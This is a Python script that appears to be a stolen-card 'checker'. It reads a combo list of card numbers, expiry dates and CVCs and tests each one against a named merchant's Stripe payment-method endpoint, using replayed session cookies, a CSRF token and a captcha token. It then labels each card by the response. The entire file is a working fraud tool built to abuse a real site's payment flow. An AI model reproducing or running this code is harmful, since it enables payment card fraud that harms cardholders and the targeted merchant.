import requests
import re
import json
import time
def stripe1(P):
    n = P.split('|')[0]
    mm=P.split('|')[1]
    if '0' not in mm and int(mm) <= 9:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    if '20' in yy:
    	yy = yy[2:]
    else:
    	yy = yy
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')
    time.sleep(4)
    cookies = {
    'visitor_uuid': '7ac07f3f206540819529430cdd7722fd',
    '_ga': 'GA1.2.1915749278.1713193725',
    '__stripe_mid': '9dbd3b6b-9c1c-404b-b631-cc9d837158bdc3f5dc',
    'frontend_lang': 'en_US',
    'tz': 'Asia/Amman',
    '_gid': 'GA1.2.599672033.1713907629',
    'session_id': '9f8d1e49b5c572ae42ba92a3fd89a728067fa659',
    '_gat': '1',
    '_gat_gtag_UA_225382491_1': '1',
    '__stripe_sid': 'af37a60b-f6f6-4387-b26b-d432d717eec225d5dc',
    }

    headers = {
    'authority': 'catechdepot.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://catechdepot.com',
    'referer': 'https://catechdepot.com/my/payment_method',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
    'jsonrpc': '2.0',
    'method': 'call',
    'params': {
        'acquirer_id': '9',
    },
    'id': 697944709,
    }

    response = requests.post(
    'https://catechdepot.com/payment/stripe/s2s/create_setup_intent',
    cookies=cookies,
    headers=headers,
    json=json_data,
    )
    se=(response.json()['result'])

    mec= se.split('_secret_')[0]
    ssid=(response.cookies['session_id'])

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    data = f'payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=4ea7cfb9-31f0-4cdc-a058-4c88f3ed159f9b22b2&payment_method_data[muid]=9dbd3b6b-9c1c-404b-b631-cc9d837158bdc3f5dc&payment_method_data[sid]=af37a60b-f6f6-4387-b26b-d432d717eec225d5dc&payment_method_data[payment_user_agent]=stripe.js%2F646ed0258c%3B+stripe-js-v3%2F646ed0258c%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcatechdepot.com&payment_method_data[time_on_page]=37510&expected_payment_method_type=card&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZJoJeIQBrGUhKXpq_MzAlxsNvVEFoo8-EbvTk6HuSa1i_zuBKyHv-8WxZWnmOgcbchaDDiBX0WvpH8-Us0Ffc3h_Q2yJTVYlcnvi-xzAhwiRfevEPQSwNl5pQS5JlxdOrkYpdnb8MGoFIDxldZ2T3GD2JQMib74tst5BJTih3XrdZnRRy1xXBCnfWIrWtPbYB2c3jFNrGot35uvwhcqjcS8bp27aK6w8uaIyUDyswOSGSxp9ezFBRMk4_wOS5Pck9pJLvLgvFt1daYZse6Gg0cEkSqIh9spU5dpeUwWzC9XqcK9_HRFYcJXJfw1BfJzwtr8OTvwdLzN3zqrHVOckS8p0Rn5E8rFDpRrreBzTaW5pnPXHPvqXH5MfouqTSDKLIygA15cJRHms6xFht4NtkyvqUGg4rm5CWPQ9NWNZGF-rAEksew9Q8uHtZ_ipJzpB2LN6Ae538n9tNi00V8iGBOzQfuHmi-83RmC54x9-Qb5B74t7-_bDM1HcmbAHvbqr8qw6fBFIfa7lesmrlDT6xqnYfolZDCFPDAeDZrgmtLoB1SrSrcWQotSB-4yZg5_ygUT_eCCqeWPG5k5iG0-pYZ_HY00euOc_OKdxP-Q6O55v0wfANyDGBk5b0o3MF-253K5fLFKEeA8fo7PpaFf47E93ZkqHYvU5k7FHpPDm_51N6gHRuxvxDNpJv3x3JzF9e-nUON0bNptb3t08v1bHeQc20ZsW6tvczT7VDiHCm1vjM47gdqKDi7umHqCITicSWFii3PN_Q2-XGx026lpcONJ46Al17sv0lcVI_gvZxBST9sjJXoPaX-Pe7lgx6WM8C1BgV_s-MZ7HzJYPKd1KXi9Le5PaHGk5P_2eEPdBYNXwtNbUKIaPUjZolM9JD92clNLglWykJgZuf3iIcZqRmdFSjeBava2FRp9bSOZxHpFs7NzJqG5domxCnR8agNNGqJZ1F5uDotFNLZsnqU7jhYhJPZx3q4qcFxYVOrz6p4ZGE8HrBGWdOBgki5EKg2FlAtdlON-8DZk30NoBY5LFOGO_3JGQ2U0-FJVawF3ev5HfjGIGnr4Jd31aCkR5gfzqNSg_L19eihlQOOc9oQVh8jHEqKhk7T-YNOwBPTZ0GEqYfgM6ewQ9d4Wggiuuwc8JG-alBfLB73pr6xLroQdEcIoyY2po3MH5s6h98_alsaNVwIHdh_O7qPb3iXZPq5TvjYZneRfGMlMgG2MYDQ48khkagWijHvkmJ005xeqBBG1dwdhJiTkup4qmdW33RtVHvnqw7g4p9AAvt4tlmIgKy2aT7qTNs6n2a8vW0r7Ajof7xGJSrB7DDBMri4C1NcyH60ICjATngyz9YbiZ_lplB2ZFGIV-_d6lORgkqNo4uZ59KG8CJnpf01emZeP27eCM-V20kHVMbMSPtbL2L35SPnm2xWmuWhJ6VJ5OahLf3OPUgM56OJYS4uEvYdV5yu1eMwN8i6JfzDG9hdBpKV9cADv-4yC1rItPczRNTFcktT7cn1AZRlP1PomANjfwx2ZmlYUfP953ZBc7BYliZ1G_OUDiLH4KI7zPvXN5QtKqkrAo2i6ceqxtpuKAD6RaUgI7X9RuK8o5E0uXdWW3E3Jvlgq1vGq4yrvc2uS9OQg46tb633x6TqFh1XR8I0C0qiMALC9lSzI7txwX5_hemVWT8G3CAsLIQzwvBuV_sd4UsmCjoCLeXxD5IE-fmIvwGq91Qubia5FOL-hGiLcO061xg-mT3n8pUkTKuc32Z0ajoDfpMeMc-D_rtw1jSuJ2bmVuxSLUc4SqE2vGxEaX-ghqpgPMu1F8DHknfiXe9TCrvEXGIiOpkkkqKecn_IHKXuQ7sGjv0Mybwn3iG25Nvr1O4QkzGdUhH3_X_TQniYxgfghS_tzRKl9krNC6y3Hpq-uI3rPTG5BRD0rNmOOyP1Pil3tZqZYMa5yyO9_YgfjK8lsmGVpYd-tJFlBWZvZb2RyXYxsWsTrCjesreGO7QIDi25h4NJDILv1c-6tD0jZ0jhwHI5mA-YSMC0XoV4yYlHIj5EDA6eJZ_5yVzcNvH-evJix8acZDB-S-MMeT4HVfYznWcR6kyuAUIrFuZqNSe2_FeORv1iJAZmLe8sidX2Snpr33DrOnjk3_qqwKNleHDOZigo26hzaGFyZF9pZM4DMYNvomtyp2E0YmExOTaicGQA.GbIFJGjr6ruN6GVre06pmWCB6X3-AdXEDs6h2LeZQeI&use_stripe_sdk=true&key=pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0&client_secret={se}'

    response = requests.post(
    f'https://api.stripe.com/v1/setup_intents/{mec}/confirm',
    headers=headers,
    data=data,
    )
    #print(response.text)
    try:
    	pm = (response.json()['payment_method'])
    	time.sleep(2)
    except:
    	if "Your card's security code is invalid." in response.text:
    		msg = ' CNN CARD '
    	elif 'Your card number is incorrect.' in response.text:
    		msg = ' Invalid Card '
    	return msg
    cookies = {
    'visitor_uuid': '7ac07f3f206540819529430cdd7722fd',
    '_ga': 'GA1.2.1915749278.1713193725',
    '__stripe_mid': '9dbd3b6b-9c1c-404b-b631-cc9d837158bdc3f5dc',
    'frontend_lang': 'en_US',
    'tz': 'Asia/Amman',
    '_gid': 'GA1.2.599672033.1713907629',
    'session_id': ssid,
    '_gat': '1',
    '_gat_gtag_UA_225382491_1': '1',
    '__stripe_sid': 'af37a60b-f6f6-4387-b26b-d432d717eec225d5dc',
    }

    headers = {
    'authority': 'catechdepot.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://catechdepot.com',
    'referer': 'https://catechdepot.com/my/payment_method',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    json_data = {
    'jsonrpc': '2.0',
    'method': 'call',
    'params': {
        'verify_validity': 'True',
        'data_set': '/payment/stripe/s2s/create_json_3ds',
        'acquirer_id': '9',
        'stripe_publishable_key': 'pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0',
        'currency_id': '',
        'return_url': '/my/payment_method',
        'partner_id': '3074',
        'csrf_token': 'b1dfc9e24e2e0f1121ccf439aaacb12ff784e002o1745443769',
        'payment_method': pm,
    },
    'id': 716124390,
    }

    response = requests.post(
    'https://catechdepot.com/payment/stripe/s2s/create_json_3ds',
    cookies=cookies,
    headers=headers,
    json=json_data,
    )
    try:
    	g=(response.json()['error']['data']['message'])
    	g2 = g.split(':')[1]
    except:
    	g2 = response.text
    return g2

file=input('enter combo list: ')
gg =open(file,'r')
for gg in gg:
	cc = gg.strip().split('\n')[0]
	print(cc,stripe1(cc))